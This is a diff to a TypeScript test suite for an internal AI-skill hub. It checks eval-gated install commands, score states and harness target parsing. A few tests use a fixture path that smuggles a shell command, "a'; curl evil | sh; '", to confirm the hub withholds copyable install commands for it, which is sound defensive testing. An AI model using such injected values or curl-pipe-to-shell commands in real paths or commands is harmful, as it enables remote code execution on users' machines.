@@ -7,9 +7,12 @@ import {
   readEvalScore,
   readInstallUnavailable,
   readHarnesses,
+  scoreState,
   readInstallCommands,
   isInstallable,
 } from '@internal/plugin-skill-hub-common';
+import { readFileSync } from 'fs';
+import { join } from 'path';
 import { RepoRef, TreeEntry } from '../github/GithubAssetReader';
 import { buildEntities, publishedPaths } from './entities';
 import { parseManifest } from './manifest';
@@ -120,11 +123,9 @@ publish:
 
     const skill = entities[0];
     expect(isInstallable(skill)).toBe(false);
-    // A command still exists: the gate is the score, not the absence of a
-    // command, and the panel needs something to show once it is scored.
-    expect(readInstallCommands(skill).claude).toContain(
-      `ainb skill install 'gh:wololo-labs/estate@${SHA}/skills/lonely'`,
-    );
+    // The gate is enforced here, not only in the UI: no passing score, no
+    // command to copy.
+    expect(readInstallCommands(skill)).toEqual({});
   });
 
   it('gives a pack its score and gives its members the same score and command', async () => {
@@ -225,7 +226,8 @@ publish:
         'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
       ),
       ...repository({
-        'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\nversion: 0.1.0\n',
+        'packages/qe-agent-pack/apm.yml':
+          'name: qe-agent-pack\nversion: 0.1.0\n',
         'packages/qe-agent-pack/eval-gate-report.json': gateReport,
         'packages/qe-agent-pack/eval-score.json': '{"verdict":"IGNORED"}',
       }),
@@ -248,9 +250,299 @@ publish:
     });
   });
 
+  it('keeps a measurably worse asset uninstallable when its score came from eval-score.json', async () => {
+    const { entities } = await buildEntities({
+      repo: REPO,
+      commitSha: SHA,
+      manifest: parseManifest(
+        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+      ),
+      ...repository({
+        'packages/p/apm.yml': 'name: p\n',
+        'packages/p/eval-score.json': JSON.stringify({
+          verdict: 'PASS',
+          stats: { significant_regression: true },
+        }),
+      }),
+    });
+    expect(scoreState(readEvalScore(entities[0]))).toBe('regressed');
+    expect(isInstallable(entities[0])).toBe(false);
+  });
+
+  describe('only a gate report can show a gain', () => {
+    const stateOf = async (files: Record<string, string>) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          ...files,
+        }),
+      });
+      const score = readEvalScore(entities[0])!;
+      return { state: scoreState(score), origin: score.origin };
+    };
+    const claim = { verdict: 'PASS', stats: { significant_improvement: true } };
+
+    it('records a no-skill baseline only when the report says so', async () => {
+      const kind = async (extra: object) => {
+        const { entities } = await buildEntities({
+          repo: REPO,
+          commitSha: SHA,
+          manifest: parseManifest(
+            'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+          ),
+          ...repository({
+            'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+            'packages/p/eval-gate-report.json': JSON.stringify({
+              verdict: 'pass',
+              signals: [],
+              ...extra,
+            }),
+          }),
+        });
+        return readEvalScore(entities[0])!.baselineKind;
+      };
+      expect(await kind({ baseline_kind: 'no-skill' })).toBe('no-skill');
+      expect(await kind({})).toBeUndefined();
+      expect(await kind({ baseline_kind: 'previous-release' })).toBeUndefined();
+    });
+
+    it('reads a gain from a gate report', async () => {
+      expect(
+        await stateOf({
+          'packages/p/eval-gate-report.json': JSON.stringify({
+            verdict: 'pass',
+            signals: [],
+            stats: { significant_improvement: true },
+          }),
+        }),
+      ).toEqual({ state: 'gain', origin: 'gate-report' });
+    });
+
+    it('caps a gain claimed in a hand-written eval-score.json at no gain', async () => {
+      expect(
+        await stateOf({ 'packages/p/eval-score.json': JSON.stringify(claim) }),
+      ).toEqual({ state: 'no-gain', origin: 'eval-score' });
+    });
+
+    it('caps a gain claimed in a catalogue file at no gain, whatever origin it writes for itself', async () => {
+      const catalogInfo = [
+        'apiVersion: backstage.io/v1alpha1',
+        'kind: System',
+        'metadata:',
+        '  name: p',
+        '  annotations:',
+        `    ${ANNOTATION_EVAL_SCORE}: '${JSON.stringify({
+          ...claim,
+          origin: 'gate-report',
+        })}'`,
+        'spec:',
+        '  owner: user:x',
+      ].join('\n');
+      expect(
+        await stateOf({ 'packages/p/catalog-info.yaml': catalogInfo }),
+      ).toEqual({ state: 'no-gain', origin: 'catalogue' });
+    });
+  });
+
+  describe('which scores get an install command at all', () => {
+    const commandsFor = async (report?: object) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n  skills: packages/*/.apm/skills/*/SKILL.md\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/.apm/skills/s/SKILL.md': '---\ndescription: d\n---\n',
+          ...(report
+            ? { 'packages/p/eval-gate-report.json': JSON.stringify(report) }
+            : {}),
+        }),
+      });
+      return [
+        find(entities, 'System', 'p')!,
+        find(entities, 'AiResource', 's')!,
+      ].map(e => readInstallCommands(e));
+    };
+
+    it.each([
+      ['a regression', { verdict: 'regression', signals: [] }],
+      ['a failed gate', { verdict: 'refused', signals: [] }],
+      ['no report at all', undefined],
+    ])(
+      'publishes no command for %s, so the block is not only in the UI',
+      async (_, report) => {
+        for (const commands of await commandsFor(report)) {
+          expect(commands).toEqual({});
+        }
+      },
+    );
+
+    it.each([
+      ['a pass with no gain', { verdict: 'pass', signals: [] }],
+      [
+        'a measured gain',
+        {
+          verdict: 'pass',
+          signals: [],
+          stats: { significant_improvement: true },
+        },
+      ],
+    ])('publishes the commands for %s', async (_, report) => {
+      for (const commands of await commandsFor(report)) {
+        expect(Object.keys(commands)).toContain('claude');
+      }
+    });
+  });
+
+  describe('the commit a score was measured at', () => {
+    const measuredAs = async (commit: string) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/eval-gate-report.json': JSON.stringify({
+            verdict: 'pass',
+            signals: [],
+            subject: { commit },
+          }),
+        }),
+      });
+      return readEvalScore(entities[0])!.measuredCommit;
+    };
+
+    it('lower cases an upper case sha instead of dropping it', async () => {
+      expect(await measuredAs('B'.repeat(40))).toBe('b'.repeat(40));
+    });
+
+    it('keeps a tag as written, so the score is stale and says what it was taken at', async () => {
+      expect(await measuredAs('v1.2.0')).toBe('v1.2.0');
+    });
+
+    it('keeps the tag a catalogue file was published from', async () => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\n',
+          'packages/p/catalog-info.yaml': [
+            'apiVersion: backstage.io/v1alpha1',
+            'kind: System',
+            'metadata:',
+            '  name: p',
+            '  annotations:',
+            `    ${ANNOTATION_SOURCE_LOCATION}: url:https://github.com/wololo-labs/estate/tree/v1.2.0/packages/p/`,
+            `    ${ANNOTATION_EVAL_SCORE}: '{"verdict":"PASS"}'`,
+            'spec:',
+            '  owner: user:x',
+          ].join('\n'),
+        }),
+      });
+      expect(readEvalScore(entities[0])!.measuredCommit).toBe('v1.2.0');
+    });
+  });
+
+  describe('the statistics in the gate report', () => {
+    const build = async (report: string) => {
+      const { entities } = await buildEntities({
+        repo: REPO,
+        commitSha: SHA,
+        manifest: parseManifest(
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+        ),
+        ...repository({
+          'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\n',
+          'packages/qe-agent-pack/eval-gate-report.json': report,
+        }),
+      });
+      return entities[0];
+    };
+
+    it('reads the real test-writer-pack report as a pass with no demonstrated gain', async () => {
+      // The gate report ainb-toolkit published for packages/test-writer-pack
+      // on f/test-writer-pack, verbatim.
+      const real = readFileSync(
+        join(__dirname, '__fixtures__/test-writer-pack.eval-gate-report.json'),
+        'utf8',
+      );
+      const entity = await build(real);
+      const score = readEvalScore(entity)!;
+
+      expect(score.measuredCommit).toBe(
+        'bd06dab3518ef4da02cda155d6310de176d0e3e1',
+      );
+      expect(score.sourceVisibility).toBe('internal');
+      expect(score.stats).toMatchObject({
+        ciLow: -0.01022395119096374,
+        ciHigh: 0.010485766042045853,
+        confidence: 0.95,
+        significantImprovement: false,
+        significantRegression: false,
+      });
+      expect(scoreState(score)).toBe('no-gain');
+      expect(isInstallable(entity)).toBe(true);
+    });
+
+    it('reads a significant improvement as a gain', async () => {
+      const entity = await build(
+        JSON.stringify({
+          verdict: 'pass',
+          signals: [],
+          stats: { significant_improvement: true, ci_low: 0.02, ci_high: 0.09 },
+        }),
+      );
+      expect(scoreState(readEvalScore(entity))).toBe('gain');
+    });
+
+    it('reads a regression verdict as regressed and not installable', async () => {
+      const entity = await build(
+        JSON.stringify({ verdict: 'regression', signals: [] }),
+      );
+      expect(scoreState(readEvalScore(entity))).toBe('regressed');
+      expect(isInstallable(entity)).toBe(false);
+    });
+
+    it('does not invent a gain from a report that carries no statistics', async () => {
+      const entity = await build(
+        JSON.stringify({ verdict: 'pass', signals: [] }),
+      );
+      expect(readEvalScore(entity)!.stats).toBeUndefined();
+      expect(scoreState(readEvalScore(entity))).toBe('no-gain');
+    });
+
+    it('ignores a statistic of the wrong type rather than trusting it', async () => {
+      const entity = await build(
+        JSON.stringify({
+          verdict: 'pass',
+          signals: [],
+          stats: { significant_improvement: 'true', ci_low: 'low' },
+        }),
+      );
+      expect(readEvalScore(entity)!.stats).toBeUndefined();
+      expect(scoreState(readEvalScore(entity))).toBe('no-gain');
+    });
+  });
+
   it('keeps the install blocked when the gate did not pass', async () => {
     const report = (verdict: string) =>
-      JSON.stringify({ verdict, signals: [], subject: { commit: 'd'.repeat(40) } });
+      JSON.stringify({
+        verdict,
+        signals: [],
+        subject: { commit: 'd'.repeat(40) },
+      });
 
     for (const verdict of ['regression', 'refused']) {
       const { entities } = await buildEntities({
@@ -260,7 +552,8 @@ publish:
           'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
         ),
         ...repository({
-          'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\nversion: 0.1.0\n',
+          'packages/qe-agent-pack/apm.yml':
+            'name: qe-agent-pack\nversion: 0.1.0\n',
           'packages/qe-agent-pack/eval-gate-report.json': report(verdict),
           // A hand-written PASS beside a failed gate changes nothing.
           'packages/qe-agent-pack/eval-score.json': '{"verdict":"PASS"}',
@@ -273,6 +566,9 @@ publish:
   });
 
   describe('which harnesses a pack is offered for', () => {
+    // Every pack here has passed its gate, so a missing command is down to its
+    // targets and never to its score.
+    const passing = JSON.stringify({ verdict: 'pass', signals: [] });
     const pack = async (apmYaml: string, harnesses = '') => {
       const { entities, warnings } = await buildEntities({
         repo: REPO,
@@ -282,7 +578,9 @@ publish:
         ),
         ...repository({
           'packages/p/apm.yml': apmYaml,
-          'packages/p/.apm/skills/s/SKILL.md': '---\ndescription: a skill\n---\n',
+          'packages/p/eval-gate-report.json': passing,
+          'packages/p/.apm/skills/s/SKILL.md':
+            '---\ndescription: a skill\n---\n',
         }),
       });
       return {
@@ -314,11 +612,17 @@ publish:
       // An owner who writes harnesses: [claude] has said claude is all they
       // support, so a pack declaring more does not widen it.
       const narrowed = 'harnesses: [claude]\n';
-      const both = await pack('name: p\nversion: 0.1.0\ntargets: [claude, copilot]\n', narrowed);
+      const both = await pack(
+        'name: p\nversion: 0.1.0\ntargets: [claude, copilot]\n',
+        narrowed,
+      );
       expect(readHarnesses(both.system)).toEqual(['claude']);
       expect(readHarnesses(both.skill)).toEqual(['claude']);
 
-      const outside = await pack('name: p\nversion: 0.1.0\ntargets: [cursor]\n', narrowed);
+      const outside = await pack(
+        'name: p\nversion: 0.1.0\ntargets: [cursor]\n',
+        narrowed,
+      );
       expect(readHarnesses(outside.system)).toEqual([]);
       // A pack nobody can install is a catalogue-level problem, not a silent
       // empty list: the owner is told which pack and why.
@@ -341,8 +645,14 @@ publish:
 
       it('keeps the codex command, which APM still deploys the server for', async () => {
         const { entities } = await withMcp();
-        expect(readHarnesses(server(entities))).toEqual(['claude', 'copilot', 'codex']);
-        expect(readInstallCommands(server(entities)).codex).toContain('--target codex');
+        expect(readHarnesses(server(entities))).toEqual([
+          'claude',
+          'copilot',
+          'codex',
+        ]);
+        expect(readInstallCommands(server(entities)).codex).toContain(
+          '--target codex',
+        );
       });
 
       it('still leaves codex off the pack and its skills', async () => {
@@ -389,21 +699,27 @@ publish:
         ),
         ...repository({ 'skills/s/SKILL.md': '---\ndescription: d\n---\n' }),
       });
-      expect(readHarnesses(find(entities, 'AiResource', 's')!)).toEqual(['claude']);
+      expect(readHarnesses(find(entities, 'AiResource', 's')!)).toEqual([
+        'claude',
+      ]);
     });
 
-    it('says the path is why when a standalone asset cannot be pasted into a shell', async () => {
+    it('says the path is why when a pack cannot be pasted into a shell', async () => {
+      const dir = "packages/a'; curl evil | sh; '";
       const { entities } = await buildEntities({
         repo: REPO,
         commitSha: SHA,
         manifest: parseManifest(
-          'owner: team\npublish:\n  skills: skills/*/SKILL.md\n',
+          'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
         ),
         ...repository({
-          "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: x\n---\n',
+          [`${dir}/apm.yml`]: 'name: p\nversion: 0.1.0\n',
+          [`${dir}/eval-gate-report.json`]: passing,
         }),
       });
-      expect(readInstallUnavailable(entities[0])).toBe('path');
+      expect(readInstallUnavailable(find(entities, 'System', 'p')!)).toBe(
+        'path',
+      );
     });
 
     it('does not give codex to a loose MCP file inside the pack', async () => {
@@ -417,7 +733,8 @@ publish:
           'owner: team\npublish:\n  packages: packages/*/apm.yml\n  mcp: packages/*/mcp/*.json\n',
         ),
         ...repository({
-          'packages/p/apm.yml': 'name: p\nversion: 0.1.0\ntargets: [claude, copilot]\n',
+          'packages/p/apm.yml':
+            'name: p\nversion: 0.1.0\ntargets: [claude, copilot]\n',
           'packages/p/mcp/loose.json': '{"name":"loose"}',
         }),
       });
@@ -433,7 +750,9 @@ publish:
     });
 
     it('reads the singular target key and APM slugs beyond the original three', async () => {
-      const { system } = await pack('name: p\nversion: 0.1.0\ntarget: cursor\n');
+      const { system } = await pack(
+        'name: p\nversion: 0.1.0\ntarget: cursor\n',
+      );
       expect(readHarnesses(system)).toEqual(['cursor']);
       expect(readInstallCommands(system).cursor).toContain('--target cursor');
     });
@@ -448,12 +767,16 @@ publish:
     });
 
     it('reads vscode as copilot, because APM accepts it in apm.yml as that', async () => {
-      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: [vscode]\n');
+      const { system } = await pack(
+        'name: p\nversion: 0.1.0\ntargets: [vscode]\n',
+      );
       expect(readHarnesses(system)).toEqual(['copilot']);
     });
 
     it('reads a comma separated list under the singular key, as APM does', async () => {
-      const { system } = await pack('name: p\nversion: 0.1.0\ntarget: "claude, copilot"\n');
+      const { system } = await pack(
+        'name: p\nversion: 0.1.0\ntarget: "claude, copilot"\n',
+      );
       expect(readHarnesses(system)).toEqual(['claude', 'copilot']);
     });
 
@@ -466,7 +789,9 @@ publish:
         ['"Claude, COPILOT"', ['claude', 'copilot']],
         ['[Claude, vscode]', ['claude', 'copilot']],
       ])('lowercases and resolves aliases in %s', async (value, expected) => {
-        const { system } = await pack(`name: p\nversion: 0.1.0\ntarget: ${value}\n`);
+        const { system } = await pack(
+          `name: p\nversion: 0.1.0\ntarget: ${value}\n`,
+        );
         expect(readHarnesses(system)).toEqual(expected);
       });
 
@@ -477,7 +802,9 @@ publish:
         ['a non-string entry', 'target: [claude, 1]'],
         ['all mixed with a target', 'target: "all,claude"'],
       ])('refuses %s', async (_, yaml) => {
-        const { system, warnings } = await pack(`name: p\nversion: 0.1.0\n${yaml}\n`);
+        const { system, warnings } = await pack(
+          `name: p\nversion: 0.1.0\n${yaml}\n`,
+        );
         expect(readHarnesses(system)).toEqual([]);
         expect(readInstallUnavailable(system)).toBe('refused');
         expect(warnings).toEqual([expect.stringContaining('packages/p')]);
@@ -497,14 +824,18 @@ publish:
       });
 
       it('lets all be combined with explicit-only targets', async () => {
-        const { system } = await pack('name: p\nversion: 0.1.0\ntarget: "all, agent-skills"\n');
+        const { system } = await pack(
+          'name: p\nversion: 0.1.0\ntarget: "all, agent-skills"\n',
+        );
         expect(readHarnesses(system)).toContain('agent-skills');
         expect(readHarnesses(system)).toContain('claude');
       });
     });
 
     it('reads a lone value under targets as one target', async () => {
-      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: claude\n');
+      const { system } = await pack(
+        'name: p\nversion: 0.1.0\ntargets: claude\n',
+      );
       expect(readHarnesses(system)).toEqual(['claude']);
     });
 
@@ -513,7 +844,9 @@ publish:
       // `agents` or `agy`, in a manifest. A pack that wrote them fails to
       // install, so no command is offered for them.
       for (const bad of ['Claude', 'agents', 'agy']) {
-        const { system } = await pack(`name: p\nversion: 0.1.0\ntargets: [${bad}]\n`);
+        const { system } = await pack(
+          `name: p\nversion: 0.1.0\ntargets: [${bad}]\n`,
+        );
         expect(readHarnesses(system)).toEqual([]);
       }
     });
@@ -521,14 +854,19 @@ publish:
     it.each([
       ['a scalar', 'just some text'],
       ['a list', '- a\n- b'],
-    ])('treats an apm.yml that is %s as a refused pack, not a crash', async (_, yaml) => {
-      // The reviewer's case: `'targets' in "text"` throws, which sent the
-      // whole repository to error and kept serving its stale entities.
-      const { system, warnings } = await pack(`${yaml}\n`);
-      expect(readHarnesses(system)).toEqual([]);
-      expect(readInstallCommands(system)).toEqual({});
-      expect(warnings).toEqual([expect.stringMatching(/packages\/p.*mapping/)]);
-    });
+    ])(
+      'treats an apm.yml that is %s as a refused pack, not a crash',
+      async (_, yaml) => {
+        // The reviewer's case: `'targets' in "text"` throws, which sent the
+        // whole repository to error and kept serving its stale entities.
+        const { system, warnings } = await pack(`${yaml}\n`);
+        expect(readHarnesses(system)).toEqual([]);
+        expect(readInstallCommands(system)).toEqual({});
+        expect(warnings).toEqual([
+          expect.stringMatching(/packages\/p.*mapping/),
+        ]);
+      },
+    );
 
     it('treats an apm.yml that does not parse as a refused pack, members included', async () => {
       // Skipping it silently left its members looking like standalone assets,
@@ -546,34 +884,46 @@ publish:
       ['an empty name', 'name: ""\nversion: 0.1.0\n'],
       ['a blank version', 'name: p\nversion: "  "\n'],
       ['a version that is not a string', 'name: p\nversion: 1\n'],
-    ])('treats an apm.yml with %s as refused, because APM requires both', async (_, yaml) => {
-      // apm_cli/models/apm_package.py: name and version must be non-empty
-      // strings or APM refuses the pack.
-      const { system, skill, warnings } = await pack(yaml);
-      for (const entity of [system, skill]) {
-        expect(readHarnesses(entity)).toEqual([]);
-        expect(readInstallUnavailable(entity)).toBe('refused');
-      }
-      expect(warnings).toEqual([expect.stringMatching(/packages\/p.*(name|version)/)]);
-    });
+    ])(
+      'treats an apm.yml with %s as refused, because APM requires both',
+      async (_, yaml) => {
+        // apm_cli/models/apm_package.py: name and version must be non-empty
+        // strings or APM refuses the pack.
+        const { system, skill, warnings } = await pack(yaml);
+        for (const entity of [system, skill]) {
+          expect(readHarnesses(entity)).toEqual([]);
+          expect(readInstallUnavailable(entity)).toBe('refused');
+        }
+        expect(warnings).toEqual([
+          expect.stringMatching(/packages\/p.*(name|version)/),
+        ]);
+      },
+    );
 
     it.each([
       ['an empty list', 'targets: []'],
       ['no value', 'targets:'],
       ['both keys at once', 'targets: [claude]\ntarget: claude'],
       ['a mapping', 'targets:\n  claude: true'],
-    ])('treats %s as a declaration error, offers nothing and says so', async (_, yaml) => {
-      // APM refuses to read a manifest like this at all, so the pack cannot be
-      // installed whatever the hub offers. Falling back to the repository's
-      // harnesses would hand over a command that fails.
-      const { system, warnings } = await pack(`name: p\nversion: 0.1.0\n${yaml}\n`);
-      expect(readHarnesses(system)).toEqual([]);
-      expect(readInstallCommands(system)).toEqual({});
-      expect(warnings).toEqual([expect.stringContaining('packages/p')]);
-    });
+    ])(
+      'treats %s as a declaration error, offers nothing and says so',
+      async (_, yaml) => {
+        // APM refuses to read a manifest like this at all, so the pack cannot be
+        // installed whatever the hub offers. Falling back to the repository's
+        // harnesses would hand over a command that fails.
+        const { system, warnings } = await pack(
+          `name: p\nversion: 0.1.0\n${yaml}\n`,
+        );
+        expect(readHarnesses(system)).toEqual([]);
+        expect(readInstallCommands(system)).toEqual({});
+        expect(warnings).toEqual([expect.stringContaining('packages/p')]);
+      },
+    );
 
     it('still treats an empty singular target as no declaration, as APM does', async () => {
-      const { system, warnings } = await pack('name: p\nversion: 0.1.0\ntarget:\n');
+      const { system, warnings } = await pack(
+        'name: p\nversion: 0.1.0\ntarget:\n',
+      );
       expect(readHarnesses(system)).toEqual(['claude', 'copilot', 'codex']);
       expect(warnings).toEqual([]);
     });
@@ -602,41 +952,56 @@ publish:
     describe('why a pack offers no command', () => {
       const why = async (yaml: string, harnesses = '') => {
         const { system, skill } = await pack(yaml, harnesses);
-        expect(readInstallUnavailable(skill)).toBe(readInstallUnavailable(system));
+        expect(readInstallUnavailable(skill)).toBe(
+          readInstallUnavailable(system),
+        );
         return readInstallUnavailable(system);
       };
 
       it('says the pack declaration is the problem when APM would refuse it', async () => {
-        expect(await why('name: p\nversion: 0.1.0\ntargets: []\n')).toBe('refused');
+        expect(await why('name: p\nversion: 0.1.0\ntargets: []\n')).toBe(
+          'refused',
+        );
         expect(await why('name: [unclosed\n')).toBe('refused');
       });
 
       it('says the repository narrowed it away when only its harnesses list is why', async () => {
-        expect(await why('name: p\nversion: 0.1.0\ntargets: [cursor]\n', 'harnesses: [claude]\n')).toBe(
-          'narrowed',
-        );
+        expect(
+          await why(
+            'name: p\nversion: 0.1.0\ntargets: [cursor]\n',
+            'harnesses: [claude]\n',
+          ),
+        ).toBe('narrowed');
       });
 
       it('says the hub does not know the target when that is why', async () => {
-        expect(await why('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n')).toBe(
-          'unknown-target',
-        );
+        expect(
+          await why('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n'),
+        ).toBe('unknown-target');
       });
 
       it('says nothing when there is a command', async () => {
-        expect(await why('name: p\nversion: 0.1.0\ntargets: [claude]\n')).toBeUndefined();
+        expect(
+          await why('name: p\nversion: 0.1.0\ntargets: [claude]\n'),
+        ).toBeUndefined();
       });
     });
 
     it('reports an unknown target once, as the reason the pack is refused', async () => {
-      const { warnings } = await pack('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n');
+      const { warnings } = await pack(
+        'name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n',
+      );
       expect(warnings).toEqual([
-        expect.stringMatching(/not-a-harness.*APM 0\.33\.0.*no install command/),
+        expect.stringMatching(
+          /not-a-harness.*APM 0\.33\.0.*no install command/,
+        ),
       ]);
     });
 
     it('offers nothing for a declaration naming only unknown targets', async () => {
-      const { system } = await pack('name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n');
+      const { system } = await pack(
+        'name: p\nversion: 0.1.0\ntargets: [not-a-harness]\n',
+      );
       expect(readHarnesses(system)).toEqual([]);
       expect(readInstallCommands(system)).toEqual({});
     });
@@ -663,7 +1028,8 @@ publish:
         'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
       ),
       ...repository({
-        'packages/qe-agent-pack/apm.yml': 'name: qe-agent-pack\nversion: 0.1.0\n',
+        'packages/qe-agent-pack/apm.yml':
+          'name: qe-agent-pack\nversion: 0.1.0\n',
         'packages/qe-agent-pack/catalog-info.yaml': catalogInfo,
         'packages/qe-agent-pack/eval-score.json': '{"verdict":"IGNORED"}',
       }),
@@ -677,27 +1043,29 @@ publish:
   });
 
   it('publishes no install command for a path that could break its own quoting', async () => {
+    const passing = JSON.stringify({ verdict: 'pass', signals: [] });
     const { entities } = await buildEntities({
       repo: REPO,
       commitSha: SHA,
       manifest: parseManifest(
-        "owner: team\npublish:\n  skills: 'skills/*/SKILL.md'\n",
+        "owner: team\npublish:\n  packages: 'packages/*/apm.yml'\n",
       ),
       ...repository({
-        "skills/a'; curl evil | sh; '/SKILL.md": '---\ndescription: hostile\n---\n',
-        'skills/honest/SKILL.md': '---\ndescription: fine\n---\n',
+        "packages/a'; curl evil | sh; '/apm.yml":
+          'name: hostile\nversion: 0.1.0\n',
+        "packages/a'; curl evil | sh; '/eval-gate-report.json": passing,
+        'packages/honest/apm.yml': 'name: fine\nversion: 0.1.0\n',
+        'packages/honest/eval-gate-report.json': passing,
       }),
     });
 
-    const hostile = entities.find(e => e.metadata.description === 'hostile')!;
+    const hostile = find(entities, 'System', 'hostile')!;
     // Browsable and readable, but nothing to paste into a shell.
     expect(hostile).toBeDefined();
     expect(readInstallCommands(hostile)).toEqual({});
     expect(
-      readInstallCommands(
-        entities.find(e => e.metadata.description === 'fine')!,
-      ).claude,
-    ).toContain('ainb skill install');
+      readInstallCommands(find(entities, 'System', 'fine')!).claude,
+    ).toContain('apm install');
   });
 
   it('reports a repository with zero assets rather than losing it', async () => {
@@ -721,7 +1089,9 @@ publish:
     const { entities } = await buildEntities({
       repo: REPO,
       commitSha: SHA,
-      manifest: parseManifest('owner: team\npublish:\n  packages: packages/*/apm.yml\n'),
+      manifest: parseManifest(
+        'owner: team\npublish:\n  packages: packages/*/apm.yml\n',
+      ),
       ...repository({
         'packages/broken-pack/apm.yml': 'name: broken-pack\nversion: 0.1.0\n',
         'packages/broken-pack/eval-score.json': JSON.stringify({
@@ -761,7 +1131,10 @@ publish:
       manifest: parseManifest('owner: team\npublish:\n  packages: apm.yml\n'),
       ...repository({
         'apm.yml': 'name: root-pack\nversion: 0.1.0\ntargets: [claude]\n',
-        'eval-gate-report.json': JSON.stringify({ verdict: 'pass', signals: [] }),
+        'eval-gate-report.json': JSON.stringify({
+          verdict: 'pass',
+          signals: [],
+        }),
       }),
     });
     const system = find(entities, 'System', 'root-pack')!;
@@ -800,14 +1173,22 @@ publish:
       ...repository({
         'packages/broken/apm.yml': 'name: [unclosed',
         'packages/fine/apm.yml': 'name: fine\nversion: 0.1.0\n',
+        'packages/fine/eval-gate-report.json': JSON.stringify({
+          verdict: 'pass',
+          signals: [],
+        }),
       }),
     });
 
     // The unparseable pack is kept as a refused one, with nothing to install,
     // and the pack beside it is untouched.
     expect(entities.map(e => e.metadata.name)).toEqual(['broken', 'fine']);
-    expect(readInstallCommands(find(entities, 'System', 'broken')!)).toEqual({});
-    expect(Object.keys(readInstallCommands(find(entities, 'System', 'fine')!))).toContain('claude');
+    expect(readInstallCommands(find(entities, 'System', 'broken')!)).toEqual(
+      {},
+    );
+    expect(
+      Object.keys(readInstallCommands(find(entities, 'System', 'fine')!)),
+    ).toContain('claude');
     expect(warnings).toEqual([expect.stringContaining('packages/broken')]);
   });
 });
